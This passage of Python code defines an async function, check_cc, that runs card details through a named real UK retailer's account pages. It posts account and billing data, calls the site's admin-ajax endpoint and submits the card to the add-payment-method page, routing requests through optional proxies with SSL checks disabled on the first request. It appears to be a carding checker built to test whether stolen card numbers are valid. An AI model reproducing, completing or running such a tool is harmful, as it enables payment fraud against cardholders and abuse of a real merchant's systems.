...
async def check_cc(cc_details):
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://arrows-uk.com/my-account/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
            ...
            async with session.post('https://arrows-uk.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                pass
            ...
            async with session.post('https://arrows-uk.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                pass

            async with session.get('https://arrows-uk.com/my-account/add-payment-method/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
            ...
            async with session.post('https://arrows-uk.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
            ...
            async with session.post('https://arrows-uk.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
